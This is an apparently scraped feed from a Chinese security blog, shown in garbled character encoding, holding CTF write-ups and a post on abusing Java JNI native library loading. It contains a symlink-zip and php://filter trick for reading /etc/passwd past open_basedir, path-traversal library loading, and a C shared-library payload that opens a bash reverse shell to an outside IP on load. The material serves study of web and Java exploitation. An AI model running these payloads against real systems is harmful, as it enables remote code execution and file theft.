¹ç›®å½•ä¸‹çš„flag.txtï¼Œç„¶åå‚æ•°æ¥æºå°±æ˜¯ä¸Šè¿°çš„Targetçš„å€¼ï¼Œè°ƒç”¨äº†substr()å‡½æ•°æ¥å€Ÿå»äº†media/åçš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•å¦‚ä¸‹æ§åˆ¶æ–‡ä»¶å†…å®¹ï¼š\n1 2 3 4 5 6 7 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;Relationships xmlns=\u0026#34;http://schemas.openxmlformats.org/package/2006/relationships\u0026#34;\u0026gt; \u0026lt;Relationship Id=\u0026#34;rId1\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\u0026#34; Target=\u0026#34;media//etc/passwd\u0026#34;/\u0026gt; \u0026lt;/Relationships\u0026gt; ä»è€Œå¯ä»¥è¾¾åˆ°æ–‡ä»¶æ§åˆ¶è¦è¯»å–çš„æ–‡ä»¶çš„æ–‡ä»¶åç§°ï¼Œä½†æ˜¯åœ¨åé¢è¯»å–å®Œäº†åï¼Œåˆè°ƒç”¨äº†@zlib_decode()æ¥è¿›è¡Œè§£å‹ç¼©ï¼ŒæˆåŠŸè§£å‹ç¼©æ‰ä¼šå°†å…¶èµ‹å€¼ç»™$messagesï¼Œä»è€Œè¾“å‡ºåˆ°å‰ç«¯ï¼Œæ€ä¹ˆè§£å†³å‘¢ï¼Œæ³¨æ„file_get_contents()è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œå¹¶ä¸”å‚æ•°å¯æ§ï¼Œæœ€æœ‰åçš„æ˜¯ä»€ä¹ˆï¼Œphp fileterï¼Œæ˜¯çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨phpä¼ªåè®®å…ˆå°†å…¶å‹ç¼©ä¸€éï¼Œç„¶åè¿™é‡Œå†è¿›è¡Œè§£å‹ç¼©çš„æ—¶å€™å°±å¯ä»¥æ­£å¸¸è¾“å‡ºï¼Œå¯ä»¥æœ¬åœ°å°è¯•ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php $a=\u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;Relationships xmlns=\u0026#34;http://schemas.openxmlformats.org/package/2006/relationships\u0026#34;\u0026gt; \u0026lt;Relationship Id=\u0026#34;rId1\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\u0026#34; Target=\u0026#34;media/php://filter/zlib.deflate/resource=/etc/passwd\u0026#34;/\u0026gt; \u0026lt;/Relationships\u0026gt;\u0026#39;; $relsDom = simplexml_load_string($a); $messages = []; foreach($relsDom-\u0026gt;Relationship as $rel) { if($rel[\u0026#39;Type\u0026#39;] == \u0026#39;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\u0026#39;) { // if (!str_starts_with($rel[\u0026#39;Target\u0026#39;], \u0026#39;media/\u0026#39;)) // continue; $filename = substr($rel[\u0026#39;Target\u0026#39;], 6); var_dump($filename); $file = @file_get_contents($filename); if ($file === false) // Object relationship table points to inexistent file. Document may be corrupted break; $result = @zlib_decode($file); // This will expose them hackers! if ($result !== false) $messages[] = $result; var_dump($messages); } } ?\u0026gt; æˆåŠŸè¾“å‡ºå†…å®¹ï¼Œä½†æ˜¯é¢˜ç›®ä¸­è¿˜å­˜åœ¨ä¸€ä¸ªopen_basedirçš„é™åˆ¶ï¼Œå½“æˆ‘ä»¬è¿›å…¥åˆ°$tmpDir/word/mediaåï¼Œå°±è®¾ç½®äº†åªèƒ½è¯»å½“å‰ç›®å½•ï¼š\n1 2 chdir(\u0026#34;$tmpDir/word/media\u0026#34;); ini_set(\u0026#39;open_basedir\u0026#39;, \u0026#39;.\u0026#39;); æ‰€ä»¥éœ€è¦ç»•è¿‡ï¼ŒæŸ¥çœ‹ç»•è¿‡open_basedirçš„æ–‡ç« ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªä½¿ç”¨åˆ©ç”¨symlinkç»•è¿‡è¿›è¡Œç»•è¿‡çš„æ–¹å¼ï¼Œå°±æ˜¯ä½¿ç”¨äº†ä¸€ä¸ªè½¯é“¾æ¥çš„æ–¹å¼ï¼Œé€šçŸ¥å·²ç»éå¸¸å¸¸è§çš„zipåŒ…çš„è½¯é“¾æ¥çš„æ‰“æ³•ï¼Œæ‰€ä»¥è‡ªç„¶å°±æƒ³åˆ°äº†ä½¿ç”¨è½¯é“¾æ¥æ¥ç»•è¿‡ï¼Œä¹Ÿå°±æ˜¯å¦‚ä¸‹å‘½ä»¤ï¼š\n1 2 3 4 5 å…ˆåˆ›å»ºç›®å½•ï¼Œç„¶ååˆ›å»ºè½¯é“¾æ¥å³å¯ã€‚ ln -s A/B/C/D test ln -s test/../../../../../../../../../../../../../../etc/passwd exp rm test mkdir test ä½†æ˜¯è™½ç„¶æ˜¯æˆåŠŸåˆ›å»ºäº†è½¯é“¾æ¥ï¼Œä½†æ˜¯è¿˜æ˜¯ç»•ä¸äº†open_basedirï¼Œä¹Ÿç¡®å®å’Œå…¶åŸæœ¬çš„å®ç°ä»£ç æœ‰å‡ºå…¥ã€‚åé¢å†çœ‹wpï¼Œæ˜¯ä¸€ä¸ªéå¸¸å¦™çš„æ–¹æ³•ï¼Œæ˜¯ç›´æ¥å°†mediaè½¯é“¾æ¥åˆ°æ ¹ç›®å½•ï¼Œè¿™æ ·unzipè§£å‹æ—¶å°±é“¾æ¥è¿‡å»ï¼Œç„¶åchdiræ—¶èµ·æ—¶ä¹Ÿæ˜¯è¿›å…¥çš„æ ¹ç›®å½•ï¼Œè®¾ç½®çš„open_basedirä¹Ÿå°±æ˜¯æ ¹ç›®å½•äº†ï¼ŒæŒºå¦™çš„ä¸€ä¸ªæ€è·¯ï¼Œæ‰€ä»¥å¦‚ä¸‹æ‰“å³å¯ï¼š\næœ¬åœ°åˆ›å»ºæ–‡ä»¶ï¼š\næ–‡ä»¶å†…å®¹ä¸ºï¼š\n1 2 3 4 5 6 7 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;Relationships xmlns=\u0026#34;http://schemas.openxmlformats.org/package/2006/relationships\u0026#34;\u0026gt; \u0026lt;Relationship Id=\u0026#34;rId1\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\u0026#34; Target=\u0026#34;media/php://filter/zlib.deflate/resource=flag.txt\u0026#34;/\u0026gt; \u0026lt;/Relationships\u0026gt; ç„¶ååœ¨wordç›®å½•ä¸‹åˆ›å»ºmediaè½¯é“¾æ¥ï¼š\n1 2 3 ln -s / media cd .. zip -r --symlinks word.zip word ç„¶åä¸Šä¼ ç”Ÿæˆçš„word.zipæ–‡ä»¶å³å¯ï¼š\næˆåŠŸè·å–åˆ°flag:\n1 flag{1fi_z1ib_y0ur_k3OOOOw} â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\n","date":"2025-08-13T09:03:52+08:00","permalink":"https://fupanc-w1n.github.io/p/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%B0%81%E7%A5%9E%E5%8F%B0ctf/","title":"ç¬¬ä¹å±Šå°ç¥å°ctf"},{"content":"JNI JNIçš„å®šä¹‰ JNI(Java Native Interface)ï¼Œå®ƒå…è®¸Javaè™šæ‹Ÿæœºä¸­è¿è¡Œçš„Javaä»£ç ä¸å…¶å®ƒç¼–ç¨‹è¯­è¨€ï¼ˆå¦‚Cã€C++å’Œæ±‡ç¼–è¯­è¨€ï¼‰ç¼–å†™çš„åº”ç”¨ç¨‹åºå’Œåº“è¿›è¡Œè°ƒç”¨å¤„ç†æ“ä½œã€‚åœ¨å¦‚ä¸‹å‡ ç§æƒ…å†µå¯ä»¥ä½¿ç”¨ï¼š\næ ‡å‡†Javaç±»åº“ä¸æ”¯æŒåº”ç”¨ç¨‹åºæ‰€éœ€çš„å¹³å°ç›¸å…³åŠŸèƒ½ã€‚ å·²ç»ä½¿ç”¨å¦ä¸€ç§è¯­è¨€ç¼–å†™çš„åº“ï¼Œå¯ä»¥é€šè¿‡JNIè®©Javaä»£ç è®¿é—®æ¥è°ƒç”¨å®ƒ æƒ³ä½¿ç”¨æ±‡ç¼–ç­‰ç¬¬è¯­è¨€å®ç°ä¸€å°éƒ¨åˆ†å…³é”®ä»£ç  ç”±æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ è½½åŠ¨æ€é“¾æ¥åº“æ¥è¿›è¡Œåˆ©ç”¨ã€‚\nJNIçš„åˆ©ç”¨ ä»£ç è°ƒè¯• ä¸åŒçš„ç³»ç»ŸåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶åç¼€æ˜¯ä¸åŒçš„ï¼Œæ¯”å¦‚linuxæ˜¯.soæ–‡ä»¶ï¼Œè€Œwindowsæ˜¯.dllæ–‡ä»¶ï¼Œmacosç³»ç»Ÿä¸‹å°±æ˜¯.dylibæ–‡ä»¶ç­‰ï¼Œè¿™é‡Œä¸»è¦æ˜¯è¯´æ˜åœ¨linuxä¸‹çš„åˆ©ç”¨ã€‚\nå…³äºjniçš„ä¸€äº›ä»£ç è¯´æ˜ï¼Œå¦‚ä¸‹æ–‡ç« å·²ç»è¯´çš„éå¸¸æ¸…æ¥šäº†ï¼š https://tttang.com/archive/1436/\nç®€å•è°ƒè¯•åˆ†æä¸€ä¸‹å³å¯ï¼Œæˆ‘ä»¬å¸¸åˆ©ç”¨çš„ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 package org.example; public class Text { public static void main(String[] args) throws Exception { System.load(\u0026#34;/tmp/123.so\u0026#34;); } } æœ¬è´¨æ˜¯è°ƒç”¨çš„Runtimeç±»çš„load0()æ–¹æ³•ï¼š\nåœ¨javaçš„æ³¨é‡Šä¸­å¯ä»¥çœ‹åˆ°å¯¹è¿™ä¸ªSystem.load()æ–¹æ³•æœ‰ä¸€äº›è¯´æ˜ï¼š\næ‰€ä»¥è¿™é‡ŒåŠ¨æ€åŠ è½½çš„soåº“æ–‡ä»¶éœ€è¦ç»™å‡ºå®Œæ•´çš„è·¯å¾„ã€‚\nè·Ÿè¿›Runtimeç±»çš„load0()æ–¹æ³•ï¼š\nå¾ˆå®¹æ˜“çœ‹åˆ°è¿™é‡Œå…¶å®åœ¨Runtimeç±»ä¸­ä¹Ÿå­˜åœ¨ä¸€ä¸ªload()æ–¹æ³•å¯ä»¥è°ƒç”¨åˆ°æŒ‡å®šçš„load0()æ–¹æ³•ï¼Œæ‰€ä»¥å…¶å®ä¹Ÿå¯ä»¥å¦‚ä¸‹è°ƒç”¨ï¼š\n1 2 3 4 5 6 7 8 9 10 package org.example; public class Text { public static void main(String[] args) throws Exception { System.load(\u0026#34;/tmp/123.so\u0026#34;); Runtime.getRuntime().load(\u0026#34;/tmp/123.so\u0026#34;); // System.out.println(\u0026#34;Hello World!\u0026#34;); // System.out.println(System.getProperty(\u0026#34;java.library.path\u0026#34;)); } } ä¹Ÿå°±æ˜¯é€šè¿‡Runtimeæ¥è¿›è¡ŒåŠ è½½åŠ¨æ€é“¾æ¥åº“ï¼Œå›åˆ°è°ƒè¯•è¿‡ç¨‹ï¼š\nå…ˆæ˜¯åˆ¤æ–­æ˜¯å¦ä¸ºç»å¯¹è·¯å¾„ï¼Œç„¶åè°ƒç”¨äº†loadLibrary()æ–¹æ³•å¹¶åœ¨å‚æ•°ä¼ é€’ä¸­å°†isAbsoluteè®¾ç½®ä¸ºäº†trueï¼š\nç„¶åå°±ä¼šè°ƒç”¨loadLibrary0()è¿›è¡ŒåŠ è½½ï¼Œç„¶åè¿™ä¸ªæ–¹æ³•å¯¹è¦åŠ è½½çš„åº“è¿›è¡Œäº†ä¸€äº›åˆ¤æ–­ï¼Œå¯ä»¥ç›´æ¥ä»æŠ›å‡ºçš„å¼‚å¸¸æ¥çœ‹ï¼š\næ˜¯å¦å·²ç»è¢«åŠ è½½ï¼š\næ­£åœ¨è¢«åŠ è½½ï¼š\nè‹¥æ— ä¸Šè¿°æƒ…å†µï¼Œæœ€åå°±ä¼šè°ƒç”¨NativeLibraryç±»çš„load()æ–¹æ³•è¿›è¡ŒåŠ è½½ï¼š åç»­çš„NativeLibraryç±»çš„load()æ–¹æ³•å°±æ¯”è¾ƒåº•å±‚äº†ï¼Œä¸æ¶‰åŠã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nåŒæ—¶å…¶å®è¿˜å­˜åœ¨ä¸€ä¸ªåŠ¨æ€åŠ è½½é“¾æ¥åº“çš„æ–¹æ³•ï¼Œä½†å±€é™æ€§æ¯”è¾ƒé«˜ï¼Œä¸»è¦æ˜¯åŠ è½½æŒ‡å®šé“¾æ¥åº“è·¯å¾„ï¼ˆä¸€èˆ¬éƒ½æ˜¯java.library.pathæŒ‡å®šè·¯å¾„ï¼‰çš„åº“æ–‡ä»¶ï¼Œå°±æ˜¯System.loadLibrary()æ–¹æ³•ï¼Œä¸»è¦å’Œå‰é¢çš„load()å¯¹æ¯”ä¸€ä¸‹ï¼Œä½¿ç”¨çš„ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 package org.example; public class Text { public static void main(String[] args) throws Exception { System.loadLibrary(\u0026#34;123\u0026#34;); // System.out.println(\u0026#34;Hello World!\u0026#34;); // System.out.println(System.getProperty(\u0026#34;java.library.path\u0026#34;)); } } ç®€å•è°ƒè¯•ä¸€ä¸‹è¿‡ç¨‹ï¼š\nåœ¨æ³¨è§£ä¸­çœ‹åˆ°å¯¹åº”æ–¹æ³•çš„è¯´æ˜ï¼š\nä¹Ÿå°±æ˜¯è¯´è¦æ±‚è¾“å…¥çš„libnameå‚æ•°åªèƒ½ä¸ºæ–‡ä»¶åï¼Œå¹¶ä¸”æ²¡æœ‰å¯¹åº”åº“æ–‡ä»¶åç¼€(123.so =\u0026gt; 123)ã€‚\nå†çœ‹è°ƒè¯•ï¼ŒåŒæ ·çš„Runtimeç±»çš„loadLibrary0()æ–¹æ³•ï¼Œå¹¶ä¸”Runtimeç±»ä¹Ÿæœ‰loadLibrary()æ–¹æ³•æ¥è°ƒç”¨loadLibrary0()æ–¹æ³•ï¼š åŒæ ·ä¼šè°ƒç”¨ClassLoader.loadLibrary()ï¼Œè¿™æ¬¡çš„å…³é”®ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 if (loader != null) { String libfilename = loader.findLibrary(name); if (libfilename != null) { File libfile = new File(libfilename); if (!libfile.isAbsolute()) { throw new UnsatisfiedLinkError( \u0026#34;ClassLoader.findLibrary failed to return an absolute path: \u0026#34; + libfilename); } if (loadLibrary0(fromClass, libfile)) { return; } throw new UnsatisfiedLinkError(\u0026#34;Can\u0026#39;t load \u0026#34; + libfilename); } } for (int i = 0 ; i \u0026lt; sys_paths.length ; i++) { File libfile = new File(sys_paths[i], System.mapLibraryName(name)); if (loadLibrary0(fromClass, libfile)) { return; } libfile = ClassLoaderHelper.mapAlternativeName(libfile); if (libfile != null \u0026amp;\u0026amp; loadLibrary0(fromClass, libfile)) { return; } } if (loader != null) { for (int i = 0 ; i \u0026lt; usr_paths.length ; i++) { File libfile = new File(usr_paths[i], System.mapLibraryName(name)); if (loadLibrary0(fromClass, libfile)) { return; } libfile = ClassLoaderHelper.mapAlternativeName(libfile); if (libfile != null \u0026amp;\u0026amp; loadLibrary0(fromClass, libfile)) { return; } } } // Oops, it failed throw new UnsatisfiedLinkError(\u0026#34;no \u0026#34; + name + \u0026#34; in java.library.path\u0026#34;); å¯ä»¥çœ‹åˆ°å°±æ˜¯åœ¨æ‰¾æ–‡ä»¶ï¼Œæ‰¾åˆ°äº†çš„è¯å°±å†è°ƒç”¨loadLibrary0()æ–¹æ³•è¿›è¡ŒåŠ è½½ï¼Œä½†æ˜¯å¯ä»¥çœ‹å‡ºéƒ½æ˜¯åœ¨æŒ‡å®šè·¯å¾„ä¸‹æ‰¾ï¼Œä»€ä¹ˆsys_pathç­‰ï¼Œæ‰€ä»¥è¯´çµæ´»æ€§æ˜¯æ²¡æœ‰load()æ–¹æ³•é«˜çš„ï¼Œå¹¶ä¸”å¯åˆ©ç”¨ç‚¹ä¹Ÿæ˜¯ç›¸å¯¹è¾ƒä½çš„ã€‚\næ€»ç»“åˆ©ç”¨ è¯´äº†è¿™ä¹ˆå¤šç›¸å…³ä»£ç ï¼Œæˆ‘ä»¬åœ¨javasecä¸­å¯ä»¥æ€ä¹ˆåˆ©ç”¨ï¼Œå¿…ä¸å¯å°‘çš„æ˜¯éœ€è¦å¯ä»¥æ‰§è¡Œä»»æ„çš„javaä»£ç ï¼Œè¿™æ ·æ‰èƒ½è°ƒç”¨System.load()æ–¹æ³•ï¼Œæ€ä¹ˆå­˜åœ¨è¿™ä¸ªsoæ–‡ä»¶å°±æ˜¯ä¸€ä¸ªéš¾é¢˜ï¼Œç®€å•æƒ³äº†ä¸€ä¸‹ï¼Œè‡³å°‘æœ‰å¦‚ä¸‹ä¸¤ä¸ªç‚¹ï¼š\næ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œä¸Šä¼ ä¸€ä¸ªç¼–è¯‘å¥½äº†çš„soæ–‡ä»¶ å†™æ–‡ä»¶å¤„ï¼Œé€šè¿‡ä¸€äº›æ–¹æ³•å¦‚ååºåˆ—åŒ–ç­‰æ¥å†™å…¥soæ–‡ä»¶ ç­‰ç­‰ï¼Œå°±å¾…åç»­å‘æ˜äº†ã€‚\nå…¶æ¬¡å°±æ˜¯è¿™ä¸ªsoæ–‡ä»¶è¯¥æ€ä¹ˆå†™ï¼Œå‰é¢è¯´äº†å¯ä»¥åŠ è½½cã€c++ç­‰è¯­è¨€ï¼Œè¿™é‡Œä¸€ä¸ªå¸¸è§çš„soæ–‡ä»¶ç”Ÿæˆè¿‡ç¨‹ï¼ˆä»¥linuxç¯å¢ƒä¸ºä¾‹ï¼‰ï¼š\nHaha.cï¼š\n1 2 3 4 5 6 7 #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; __attribute__ ((__constructor__)) void preload (void){ system(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/47.100.223.173/2333 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); } è¿™ä¸ª__attribute__ ((__constructor__))ä¹Ÿæ˜¯äº†è§£è¿‡äº†çš„ï¼Œå°±æ˜¯å¯ä»¥è®©å®ƒä¿®é¥°çš„å‡½æ•°åœ¨main()å‡½æ•°å‰æ‰§è¡Œï¼Œéå¸¸å¥½ç”¨ã€‚\nç„¶åç¼–è¯‘æˆsoæ–‡ä»¶ï¼ˆlinuxç¯å¢ƒä¸‹ï¼‰ï¼š\n1 gcc -shared -fPIC haha.c -o haha.so ç„¶åå°†è¿™ä¸ªsoæ–‡ä»¶æƒ³æ–¹å¼å¼„æœåŠ¡å™¨ä¸Šå°±è¡Œäº†ã€‚\nç„¶åæ‰§è¡Œjavaä»£ç æ¥åŠ è½½soæ–‡ä»¶å³å¯ï¼Œå¦‚ä¸‹å‡ ç§éƒ½è¡Œï¼š\n1 2 3 4 5 System.load(\u0026#34;/tmp/123.so\u0026#34;); java.lang.Runtime.getRuntime().load(\u0026#34;/tmp/123.so\u0026#34;); com.sun.glass.utils.NativeLibLoader.loadLibrary(\u0026#34;../../../../../../tmp/123\u0026#34;); è¿™é‡Œæåˆ°çš„NativeLibLoaderæœ‰ä¸€å®šçš„å±€é™æ€§ï¼Œå…ˆçœ‹æ€ä¹ˆä¸ºä»€ä¹ˆå¯ä»¥åˆ©ç”¨ï¼Œèšç„¦äºNativeLibLoader.loadLibrary()æ–¹æ³•ï¼Œä¸»è¦åœ¨å…¶å†…éƒ¨è°ƒç”¨çš„loadLibraryInternal()=\u0026gt;loadLibraryFullPath()æ–¹æ³•ä¸­ï¼š\nå¯ä»¥çœ‹åˆ°åˆ¤æ–­äº†æ“ä½œç³»ç»Ÿæ¥åˆ¤æ–­åŠ¨æ€åŠ è½½é“¾æ¥åº“çš„æ–‡ä»¶åç¼€ï¼Œå‰é¢è¿˜åˆ¤æ–­äº†ä¸€ä¸‹libDirï¼Œä¹Ÿå°±æ˜¯æœ¬åœ°åº“è·¯å¾„ï¼Œä½†æ˜¯è¿™é‡Œæ˜¯å°†ä¼ å…¥çš„libraryNameç›´æ¥æ‹¼æ¥è¿›å¹¶ä¸”å‰é¢è°ƒç”¨è¿‡ç¨‹ä¸­æ²¡æœ‰ä»€ä¹ˆæ£€æµ‹ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ç›®å½•ç©¿è¶Šæ¥åŠ è½½ç»å¯¹è·¯å¾„çš„soæ–‡ä»¶ï¼Œæœ€åè°ƒç”¨äº†System.load()æ–¹æ³•åŠ è½½ã€‚\néå¸¸ç¬¦åˆåˆ©ç”¨è¿‡ç¨‹ï¼Œä½†æ˜¯çœ‹æœ‰çš„æ–‡ç« è¯´è¿™ä¸ªç±»å¹¶ä¸æ˜¯jdké€šç”¨çš„ï¼Œæˆ‘è¿™é‡Œçš„jdk8u71å’Œjdk8u411éƒ½æ˜¯æœ‰çš„ï¼Œåˆ°æ—¶å€™å†çœ‹å§ã€‚\nè¿™ä¸ªæ–¹æ³•æ˜¯éå¸¸å¥½ç”¨çš„ï¼Œå¤šæ€è€ƒï¼Œä»¥åŠæ›´æ·±å±‚æ¬¡çš„åå°„è°ƒç”¨æ›´åº•å±‚çš„æ–¹æ³•ï¼Œä¸»è¦èä¼šè´¯é€šï¼ŒåŒæ—¶åœ¨é‚£äº›åœºæ™¯è¦æƒ³åˆ°å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”\nä¾‹é¢˜å¯ä»¥çœ‹ç¬¬åå±Šä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›çš„jaba_ezé¢˜ã€‚\nå…³äºjniçš„æ›´å¤šè¯´æ˜å°±å‚è€ƒå®˜æ–¹è¯´æ˜ï¼š\nhttps://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/intro.html\nå‚è€ƒæ–‡ç« ï¼š\nhttps://tttang.com/archive/1436/\nhttps://pankas.top/2024/03/09/%E6%B5%85%E6%9E%90java%E5%AE%89%E5%85%A8%E4%B8%ADjni%E7%9A%84%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/\n","date":"2025-08-08T18:42:45+08:00","permalink":"https://fupanc-w1n.github.io/p/jni/","title":"JNI"},{"content":"WEB è¿™æ¬¡ä¸»è¦å°±æ˜¯è®°å½•ä¸€ä¸‹ä¸¤é“javaé¢˜çš„è§£æ³•ï¼Œéƒ½ç»™äº†é™„ä»¶ã€‚\njaba_ez Ez jaba\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nç»™äº†é™„ä»¶ï¼Œjava8ï¼Œspringboot2ï¼Œåœ¨ä¾èµ–ä¸­çœ‹åˆ°fastjsonä¾èµ–ï¼š\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; ä¸€äº›å­˜åœ¨çš„jaråŒ…ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 - \u0026#34;BOOT-INF/lib/spring-boot-2.6.13.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-autoconfigure-2.6.13.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-classic-1.2.11.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-core-1.2.11.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-to-slf4j-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-api-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jul-to-slf4j-1.7.36.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jakarta.annotation-api-1.3.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/snakeyaml-1.29.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-databind-2.13.4.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-annotations-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-core-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jdk8-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jsr310-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-module-parameter-names-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-core-9.0.68.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-el-9.0.68.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-websocket-9.0.68.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-web-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-beans-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-webmvc-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-aop-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-context-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-expression-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/slf4j-api-1.7.36.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-core-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-jcl-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/fastjson-1.2.83.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-jarmode-layertools-2.6.13.jar\u0026#34; ç°åœ¨æ¥åˆ†æè·¯ç”±ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 package com.jabaez; import ch.qos.logback.classic.pattern.CallerDataConverter; import java.io.File; import java.lang.reflect.Method; import java.lang.reflect.Modifier; import java.nio.charset.Charset; import java.util.ArrayList; import java.util.Arrays; import java.util.HashMap; import java.util.List; import java.util.Map; import org.springframework.beans.factory.xml.BeanDefinitionParserDelegate; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PathVariable; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestBody; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.multipart.MultipartFile; import org.springframework.web.servlet.tags.BindTag; @RequestMapping({\u0026#34;/api\u0026#34;}) @RestController /* loaded from: jaba-ez.jar:BOOT-INF/classes/com/jabaez/VulnController.class */ public class VulnController { private static Map\u0026lt;String, ScheduledJob\u0026gt; jobs = new HashMap(); private static final String[] JOB_BLACKLIST = {\u0026#34;java.net.URL\u0026#34;, \u0026#34;javax.naming.InitialContext\u0026#34;, \u0026#34;org.yaml.snakeyaml\u0026#34;, \u0026#34;org.springframework\u0026#34;, \u0026#34;org.apache\u0026#34;, \u0026#34;rmi\u0026#34;, \u0026#34;ldap\u0026#34;, \u0026#34;ldaps\u0026#34;, \u0026#34;http\u0026#34;, \u0026#34;https\u0026#34;}; private static final String[] JOB_WHITELIST = {\u0026#34;com.jabaez.FLAG\u0026#34;}; @GetMapping({\u0026#34;/server\u0026#34;}) public Map\u0026lt;String, Object\u0026gt; getServerInfo() { Map\u0026lt;String, Object\u0026gt; info = new HashMap\u0026lt;\u0026gt;(); info.put(\u0026#34;javaHome\u0026#34;, System.getProperty(\u0026#34;java.home\u0026#34;)); info.put(\u0026#34;javaVersion\u0026#34;, System.getProperty(\u0026#34;java.version\u0026#34;)); info.put(\u0026#34;osName\u0026#34;, System.getProperty(\u0026#34;os.name\u0026#34;)); info.put(\u0026#34;userDir\u0026#34;, System.getProperty(\u0026#34;user.dir\u0026#34;)); 